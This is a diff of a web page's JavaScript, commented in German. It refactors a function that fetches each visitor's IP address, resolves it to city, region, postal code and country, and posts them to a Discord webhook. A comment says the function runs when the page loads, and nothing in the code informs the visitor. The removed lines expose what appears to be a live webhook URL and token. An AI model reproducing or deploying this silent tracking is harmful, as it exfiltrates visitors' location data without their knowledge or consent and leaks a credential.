@@ -605,54 +605,44 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
 
-function sendLocationToWebhook() {
-            // Holen der IP-Adresse
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(ipData => {
-                    const ip = ipData.ip;
+async function sendLocationToWebhook() {
+            try {
+                // Holen der IP-Adresse
+                let response = await fetch('https://api.ipify.org?format=json');
+                if (!response.ok) throw new Error('Fehler beim Abrufen der IP-Adresse');
 
-                    // Verwenden der Geolokalisierungs-API, um Standortdaten zu erhalten
-                    fetch(`https://ipapi.co/${ip}/json/`)
-                        .then(response => response.json())
-                        .then(locationData => {
-                            // Extrahieren von Standortinformationen
-                            const city = locationData.city || 'unbekannt';
-                            const region = locationData.region || 'unbekannt';
-                            const postalCode = locationData.postal || 'unbekannt';
-                            const country = locationData.country_name || 'unbekannt';
+                let ipData = await response.json();
+                const ip = ipData.ip;
 
-                            // URL deines Discord-Webhooks hier einfügen
-                            const webhookUrl = 'https://discord.com/api/webhooks/1264617165093470280/jgpRBwg6qbqssaLv2RUZCVip5PZ9ItXpsE2EfYYV4BLp97H0bxgH-1ZMJ4T5rJk28Z4t';
+                // Verwenden der Geolokalisierungs-API, um Standortdaten zu erhalten
+                response = await fetch(`https://ipapi.co/${ip}/json/`);
+                if (!response.ok) throw new Error('Fehler beim Abrufen der Standortdaten');
 
-                            // HTTP POST-Anfrage an den Webhook senden
-                            fetch(webhookUrl, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({
-                                    content: `**Neue Standortdaten:**\n\`\`\`diff\n+ Stadt: ${city}\n+ Region: ${region}\n+ Postleitzahl: ${postalCode}\n+ Land: ${country}\n\`\`\``
-                                })
-                            })
-                            .then(response => {
-                                if (response.ok) {
-                                    console.log('Standortdaten erfolgreich gesendet.');
-                                } else {
-                                    console.error('Fehler beim Senden der Standortdaten.');
-                                }
-                            })
-                            .catch(error => {
-                                console.error('Fehler:', error);
-                            });
-                        })
-                        .catch(error => {
-                            console.error('Fehler beim Abrufen der Standortdaten:', error);
-                        });
-                })
-                .catch(error => {
-                    console.error('Fehler beim Abrufen der IP-Adresse:', error);
+                let locationData = await response.json();
+                const city = locationData.city || 'unbekannt';
+                const region = locationData.region || 'unbekannt';
+                const postalCode = locationData.postal || 'unbekannt';
+                const country = locationData.country_name || 'unbekannt';
+
+                // URL deines Discord-Webhooks hier einfügen
+                const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+
+                // HTTP POST-Anfrage an den Webhook senden
+                response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `**Neue Standortdaten:**\n\`\`\`diff\n+ Stadt: ${city}\n+ Region: ${region}\n+ Postleitzahl: ${postalCode}\n+ Land: ${country}\n\`\`\``
+                    })
                 });
+                if (!response.ok) throw new Error('Fehler beim Senden der Standortdaten');
+
+                console.log('Standortdaten erfolgreich gesendet.');
+            } catch (error) {
+                console.error('Fehler:', error);
+            }
         }
 
         // Funktion aufrufen, wenn die Seite geladen wird
